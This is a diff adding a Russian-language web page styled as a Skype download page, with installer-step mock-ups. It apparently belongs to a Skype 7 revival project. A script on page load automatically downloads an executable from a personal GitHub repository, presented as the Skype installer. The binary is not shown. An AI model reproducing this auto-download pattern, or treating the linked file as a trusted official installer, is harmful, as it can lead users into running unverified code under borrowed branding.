@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Skype загружается | Установите Skype на компьютер</title>
+    <link rel="shortcut icon" href="https://web.archive.org/web/20140627015839im_/http://www.skype.com/favicon.ico" type="image/x-icon">
+    
+    <style>
+        /* Сброс стилей и базовые шрифты */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            color: #333;
+        }
+
+        a {
+            text-decoration: none;
+            color: #00aff0;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        /* Шапка (Header) */
+        header {
+            background-color: #ffffff;
+            height: 70px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 40px;
+            position: relative;
+            z-index: 20;
+        }
+
+        .header-left, .header-right {
+            display: flex;
+            align-items: center;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            margin-right: 35px;
+        }
+
+        .logo-container img {
+            height: 38px;
+            width: auto;
+            display: block;
+        }
+
+        .main-nav a {
+            margin-right: 25px;
+            color: #444;
+            font-size: 14px;
+            font-weight: 400;
+        }
+
+        .main-nav a.active-menu {
+            font-weight: bold;
+            color: #333;
+        }
+
+        .main-nav a:hover {
+            color: #00aff0;
+            text-decoration: none;
+        }
+
+        .auth-nav a {
+            margin-left: 25px;
+            font-size: 14px;
+        }
+
+        /* Секция благодарности и облаков */
+        .success-hero {
+            background-color: #eef3f7;
+            padding: 60px 20px 120px 20px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .success-hero h1 {
+            font-size: 34px;
+            font-weight: 300;
+            color: #555;
+            margin-bottom: 20px;
+        }
+
+        .success-hero p {
+            font-size: 18px;
+            font-weight: 300;
+            color: #666;
+            max-width: 600px;
+            margin: 0 auto 30px auto;
+            line-height: 1.4;
+        }
+
+        .retry-link {
+            font-size: 12px;
+            color: #555;
+            display: inline-flex;
+            align-items: center;
+            position: relative;
+            z-index: 10;
+        }
+
+        .retry-link a {
+            color: #00aff0;
+            margin-left: 5px;
+        }
+
+        .retry-link svg {
+            margin-right: 5px;
+            fill: #555;
+        }
+
+        /* Зеленые круги и облака (воссоздание графики) */
+        .green-rings {
+            position: absolute;
+            bottom: -50px;
+            right: 25%;
+            width: 300px;
+            height: 300px;
+            border-radius: 50%;
+            box-shadow: 
+                inset 0 0 0 15px rgba(115, 192, 0, 0.1),
+                inset 0 0 0 30px rgba(115, 192, 0, 0.2),
+                inset 0 0 0 45px rgba(115, 192, 0, 0.4),
+                inset 0 0 0 60px rgba(115, 192, 0, 0.7),
+                inset 0 0 0 75px #73c000;
+            z-index: 1;
+        }
+
+        .clouds {
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            width: 100%;
+            height: 100px;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1200 100' preserveAspectRatio='none'%3E%3Cpath d='M0,100 C100,100 150,50 250,50 C350,50 400,100 500,100 C600,100 650,20 750,20 C850,20 900,100 1000,100 C1100,100 1150,60 1200,60 L1200,100 Z' fill='%23ffffff'/%3E%3C/svg%3E");
+            background-size: cover;
+            background-position: center bottom;
+            z-index: 2;
+        }
+
+        /* Секция шагов установки */
+        .installation-steps {
+            max-width: 900px;
+            margin: 40px auto 80px auto;
+            padding: 0 20px;
+        }
+
+        .installation-steps h2 {
+            font-size: 22px;
+            font-weight: 300;
+            color: #555;
+            margin-bottom: 30px;
+        }
+
+        .steps-grid {
+            display: flex;
+            justify-content: space-between;
+            gap: 30px;
+        }
+
+        .step {
+            flex: 1;
+        }
+
+        /* CSS-имитация окон Windows (как на скриншоте) */
+        .window-mockup {
+            border: 1px solid #99b4d1;
+            border-radius: 4px;
+            background: #fff;
+            height: 160px;
+            margin-bottom: 15px;
+            position: relative;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .window-header {
+            background: linear-gradient(to bottom, #e4effb, #b7d1ef);
+            height: 22px;
+            border-bottom: 1px solid #99b4d1;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 5px;
+        }
+
+        .window-title {
+            font-size: 11px;
+            color: #000;
+        }
+
+        .window-close {
+            width: 35px;
+            height: 15px;
+            background-color: #c75050;
+            border: 1px solid #a33b3b;
+            border-radius: 2px;
+            position: relative;
+            box-shadow: inset 0 1px 0 rgba(255,255,255,0.4);
+        }
+
+        .window-close::before, .window-close::after {
+            content: '';
+            position: absolute;
+            width: 8px;
+            height: 1px;
+            background: white;
+            top: 6px;
+            left: 13px;
+        }
+        
+        .window-close::before { transform: rotate(45deg); }
+        .window-close::after { transform: rotate(-45deg); }
+
+        .window-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            background-color: #f0f0f0; /* Легкий серый фон окон */
+        }
+
+        /* Шаг 1: Панель загрузки IE */
+        .ie-download-bar {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 35px;
+            background-color: #ffffe1;
+            border-top: 1px solid #e1c662;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 10px;
+            box-sizing: border-box;
+        }
+
+        .ie-download-text {
+            font-size: 11px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .ie-btn {
+            background: linear-gradient(to bottom, #f5f5f5, #d8d8d8);
+            border: 1px solid #999;
+            border-radius: 2px;
+            font-size: 11px;
+            padding: 2px 8px;
+            display: flex;
+            align-items: center;
+            color: #000;
+        }
+
+        .ie-btn span {
+            margin-left: 5px;
+            font-size: 8px;
+        }
+
+        /* Шаг 2 и 3: Иконки внутри окон */
+        .setup-icon-container {
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .step-title {
+            font-size: 14px;
+            color: #444;
+            margin-bottom: 8px;
+            font-weight: normal;
+        }
+
+        .step-desc {
+            font-size: 12px;
+            color: #666;
+            line-height: 1.4;
+        }
+    </style>
+
+    <!-- Скрипт для автоматического скачивания файла с небольшой задержкой -->
+    <script>
+        window.onload = function() {
+            setTimeout(function() {
+                window.location.href = "https://github.com/nekxd/nekxd.github.io/releases/download/Skype/Skype7.exe";
+            }, 1500); // Начнется через 1.5 секунды
+        };
+    </script>
+</head>
+<body>
+
+    <!-- Шапка (идентична download.html) -->
+    <header>
+        <div class="header-left">
+            <a href="index.html" class="logo-container">
+                <img src="https://github.com/nekxd/nekxd.github.io/blob/main/Skype.webp?raw=true" alt="Skype Logo">
+            </a>
+            <nav class="main-nav">
+                <a href="#">Подробно</a>
+                <a href="#">Расценки</a>
+                <a href="download.html" class="active-menu">Загрузка</a>
+                <a href="#">Поддержка</a>
+            </nav>
+        </div>
+        <div class="header-right auth-nav">
+            <a href="https://apps.skype.dev/web/login/?next=%2Fweb">Войти</a>
+            <a href="https://discord.gg/skype" style="font-weight: bold;">Присоединяйтесь!</a>
+        </div>
+    </header>
+
+    <!-- Секция с благодарностью и фоном (облака + зелёные круги) -->
+    <section class="success-hero">
+        <div class="green-rings"></div>
+        <div class="clouds"></div>
+        
+        <div style="position: relative; z-index: 10;">
+            <h1>Начните пользоваться новым Skype прямо сегодня!</h1>
+            <p>Благодарим вас за загрузку приложения! Теперь, чтобы начать работу, загляните в наше краткое руководство по установке.</p>
+            
+            <div class="retry-link">
+                <svg width="14" height="14" viewBox="0 0 24 24">
+                    <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/>
+                </svg>
+                Проблема с загрузкой? 
+                <!-- Ссылка для ручного скачивания -->
+                <a href="https://github.com/nekxd/nekxd.github.io/releases/download/Skype/Skype7.exe">Повторите попытку</a>
+            </div>
+        </div>
+    </section>
+
+    <!-- Секция шагов установки с CSS-интерфейсами -->
+    <section class="installation-steps">
+        <h2>Установка Skype для Windows</h2>
+        
+        <div class="steps-grid">
+            <!-- Шаг 1 -->
+            <div class="step">
+                <div class="window-mockup" style="background: #fff;">
+                    <!-- Без классической шапки Windows, просто белое окно с полосой внизу -->
+                    <div class="window-content" style="background: #fff;">
+                        <div class="ie-download-bar">
+                            <div class="ie-download-text">SkypeSetup.exe</div>
+                            <div class="ie-btn">Save <span>▼</span></div>
+                            <div style="font-size: 16px; cursor: pointer; color: #666; margin-left: 5px;">×</div>
+                        </div>
+                    </div>
+                </div>
+                <h3 class="step-title">Шаг 1</h3>
+                <p class="step-desc">Сохраните установочный файл Skype на своем компьютере.</p>
+            </div>
+
+            <!-- Шаг 2 -->
+            <div class="step">
+                <div class="window-mockup">
+                    <div class="window-header">
+                        <div class="window-title">Skype Setup</div>
+                        <div class="window-close"></div>
+                    </div>
+                    <div class="window-content">
+                        <!-- Имитация иконки установщика -->
+                        <div class="setup-icon-container">
+                            <!-- Коробка -->
+                            <svg width="60" height="60" viewBox="0 0 100 100">
+                                <path d="M20,40 L80,40 L90,80 L10,80 Z" fill="#d9b38c" stroke="#a68059" stroke-width="2"/>
+                                <path d="M20,40 L40,10 L60,10 L80,40 Z" fill="#ecd5c0" stroke="#a68059" stroke-width="2"/>
+                                <!-- Skype Logo внутри коробки -->
+                                <circle cx="50" cy="55" r="16" fill="#00aff0" />
+                                <text x="50%" y="62%" font-family="Arial" font-weight="bold" font-size="16" fill="white" text-anchor="middle">S</text>
+                                <!-- UAC Щит (имитация) -->
+                                <path d="M60,60 L75,60 L75,75 C75,85 67.5,90 67.5,90 C67.5,90 60,85 60,75 Z" fill="#ffcc00" stroke="#333" stroke-width="1"/>
+                                <path d="M67.5,60 L75,60 L75,75 C75,85 67.5,90 67.5,90 Z" fill="#0066cc"/>
+                            </svg>
+                            <div style="position: absolute; bottom: -15px; font-size: 10px; color: #000;">SkypeSetup</div>
+                        </div>
+                    </div>
+                </div>
+                <h3 class="step-title">Шаг 2</h3>
+                <p class="step-desc">Дважды щелкните по установочному файлу Skype и выполните простые действия для завершения установки.</p>
+            </div>
+
+            <!-- Шаг 3 -->
+            <div class="step">
+                <div class="window-mockup">
+                    <div class="window-header">
+                        <div class="window-title">Skype Setup</div>
+                        <div class="window-close"></div>
+                    </div>
+                    <div class="window-content">
+                        <!-- Имитация запускающегося логотипа Skype -->
+                        <div class="setup-icon-container">
+                            <svg width="70" height="70" viewBox="0 0 100 100">
+                                <circle cx="50" cy="50" r="40" fill="#00aff0" />
+                                <path d="M30,30 a15,15 0 0,0 0,-20 a15,15 0 0,0 -20,0 a15,15 0 0,0 0,20" fill="#00aff0" transform="translate(10, 10)"/>
+                                <path d="M70,70 a15,15 0 0,0 0,20 a15,15 0 0,0 20,0 a15,15 0 0,0 0,-20" fill="#00aff0" transform="translate(-10, -10)"/>
+                                <text x="50%" y="67%" font-family="Arial" font-weight="bold" font-size="46" fill="white" text-anchor="middle">S</text>
+                            </svg>
+                        </div>
+                    </div>
+                </div>
+                <h3 class="step-title">Шаг 3</h3>
+                <p class="step-desc">Запустите программу Skype и войдите в сеть, указав свой логин и пароль.</p>
+            </div>
+        </div>
+    </section>
+
+</body>
+</html>
